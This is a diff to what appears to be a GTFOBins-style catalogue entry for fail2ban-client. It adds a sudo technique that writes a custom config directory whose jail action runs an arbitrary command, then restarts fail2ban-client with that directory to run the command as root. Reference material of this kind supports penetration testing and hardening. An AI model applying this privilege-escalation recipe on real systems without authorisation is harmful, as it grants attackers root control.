@@ -14,4 +14,30 @@ functions:
       The subprocess is immediately sent to the background, but `fail2ban-client` waits on a return code from the subprocess. The `banip` command will hang until the subprocess returns.
     contexts:
       sudo:
+  - blind: true
+    code: |-
+      cat >/path/to/temp-dir/fail2ban.conf <<EOF
+      [Definition]
+      EOF
+
+      cat >/path/to/temp-dir/jail.local <<EOF
+      [x]
+      enabled = true
+      action = x
+      EOF
+
+      mkdir -p /path/to/temp-dir/action.d/
+      cat >/path/to/temp-dir/action.d/x.conf <<EOF
+      [Definition]
+      actionstart = /path/to/command
+      EOF
+
+      mkdir -p /path/to/temp-dir/filter.d/
+      cat >/path/to/temp-dir/filter.d/x.conf <<EOF
+      [Definition]
+      EOF
+
+      fail2ban-client -c /path/to/temp-dir/ -v restart
+    contexts:
+      sudo:
 ...
